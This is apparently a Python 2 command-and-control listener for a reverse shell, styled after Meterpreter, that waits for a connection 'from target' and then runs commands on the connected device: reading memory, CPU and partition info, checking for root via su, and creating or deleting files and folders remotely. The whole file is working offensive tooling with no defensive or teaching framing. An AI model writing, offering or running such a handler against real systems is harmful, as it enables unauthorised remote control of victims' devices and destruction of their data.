import os
import sys
from time import sleep

def listener():
    try:
        host = raw_input("ip<( ")
        port = input("port<( ")
        import socket
        import sys
        from time import sleep
 
        print("[+] Listening on port "+str(port))
        sleep(1)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((host, port))
        s.listen(5)
        print("[+] Waiting Connection From target . . .")
        c, _ = s.accept()
        print('[*] Sessions Opened | ' + 'IP :\33[92;1m ' + _[0] + '\33[00m | Port : \33[92;1m' + str(_[1])+'\33[00m\n')
        sleep(2)

        while True:
            hosttt = _[0]
            cmd = raw_input('meterpreter<( \33[91;1m'+_[0]+'\33[00m)<(')
            if cmd[0:5] == 'mkdir':
                c.send(cmd+' && pwd\n')
                c.recv(1024)
        
            elif cmd == 'help':
                print'''
+---------------------------------------------+
Command         |      Description   
+---------------------------------------------+
kernel_info    -+-   kernel info
mkdir          -+-   Create Directory On Target
meminfo        -+-   Check memoryinfo on targets device
cpuinfo        -+-   Check Info CPU Target
rm             -+-   Remove File On Target
rmdir          -+-   Remove Folder On Target
whoami         -+-   Check Name User Target
check_part     -+-   Check Info Partition on target
'''
         
            elif cmd == 'clear':
                os.system('clear')

            elif cmd == 'help':
                help()
					
            elif cmd == 'meminfo':
                c.send('cat /proc/meminfo')
                print c.recv(1024)
 
            elif cmd == 'cpuinfo':
                c.send('cat /proc/cpuinfo')
                print c.recv(1024) 
            elif cmd == 'kernel_info':
                c.send(cmd)
                ab = c.recv(1024)
                print("\n[+] \033[37;1mKernel Version : "+ab)
 
            elif cmd == 'check_root':
                c.send('which su')
                a = c.recv(1024)
                if a == '\n/system/bin/su\n':
                    print("\n[*] This Device Is Rooted . . .\n")
                else:
                    print("\n[*] This Device Not Rooted . . .\n")
 
            elif cmd == 'su':
                print("\n[*] Command 'SU' Not Working . . .\n")
 
            elif cmd == 'check_part':
                c.send('cat /proc/partitions')
                print ''
                print c.recv(100000)

            elif cmd == 'exit':
                break
 
            elif cmd[0:2] == 'rm':
                c.send(cmd+' && pwd\n')
                c.recv(1024)
					
            elif cmd[0:5] == 'rmdir':
                c.send(cmd+' && pwd\n')
                c.recv(1024)
				
            elif cmd[0:6] == 'whoami':
                c.send('whoami')
                print c.recv(1024)
    except:
        print '\33[91;1m[?]An error ocurred\33[00m'
